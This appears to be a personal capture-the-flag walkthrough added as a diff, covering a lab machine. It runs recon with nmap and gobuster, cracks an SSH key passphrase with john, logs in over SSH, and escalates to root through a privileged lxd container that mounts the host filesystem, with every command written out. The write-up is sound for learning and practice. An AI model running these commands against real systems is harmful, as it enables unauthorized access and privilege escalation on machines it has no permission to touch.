@@ -1,0 +1,49 @@
+first do an nmap, will not show anything with a -Pn
+	sudo nmap -p- -vv -sC -sV -A -O -Pn 10.10.207.250
+We see port 80 and 22 immediantely, lets go to port 80
+Lets also start a gobuster
+	gobuster dir -u http://10.10.207.250/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+	we find a couple of things in /uploads including a dict list, looks like a wordlist for passwords
+	lets copy that to make a wordlist out of it
+	In secret we find a secret key, lets use john for ssh2john
+		make a new nano file, copy and paste the rsa key
+		python /usr/share/john/ssh2john.py gaming_rsa > gamingcrack
+		sudo john --wordlist=/usr/share/wordlists/rockyou.txt gaming_rsa
+			we have a password
+			but we still done have a name
+I decided to go back to the main site and inspect element, we can see in green the name john, lets try that
+sudo ssh -i gaming_rsa john@10.10.207.250
+	ls -la and we find a user.txt
+	we found the user flag YEAH
+now we have to get root
+I first tried hydra with the password list that I obtained before, however I do not know if this is a rabbit hole or not
+It seems like it is, maybe the password was in that wordlist but we used rockyou.txt so we did not need their wordlist for this exercise
+I logged back into john and saw that there was something called lxd, i have no idea what this is
+	lxd turns out to be a linux container for root processes
+	after some more research we can utilize an Alphine Builder which allows us to use lxd
+		git clone https://github.com/saghul/lxd-alpine-builder.git
+		cd lxd-alpine-builder
+		sudo ./build-alpine
+			this is going to take a minute
+	while this is downloading see what john is capable of, such as typing in wget to know if we can just transfer the files over
+		we can
+	going through the directories we can see that john doesn't have much power, but lxd does
+finally alpine finished and we can continue
+another ls -la shows us that we have a tar.gz file lets send that over to john
+lets first make a web server to send alpine over to john
+python3 -m http.server on local machine
+	on johns machine wget http://10.9.124.138:8000/alpine-v3.12-x86_64-20201118_0656.tar.gz
+I unzipped it, that is why I do not have the gz at the end anymore, however I do not know if this is correct yet
+	now import the image lxc image import ./alpine-v3.12-x86_64-20201118_0656.tar --alias my_image
+	now we need to mount the image to the root directory
+		lxc init my_image ignite -c security.privileged=true
+		lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
+		execute bin/sh to get to root
+			lxc exec ignite /bin/sh
+				cd ..
+				cd /root/
+				nothing here
+				find / -name root.txt
+				go to that directory and you will find root.txt
+
+
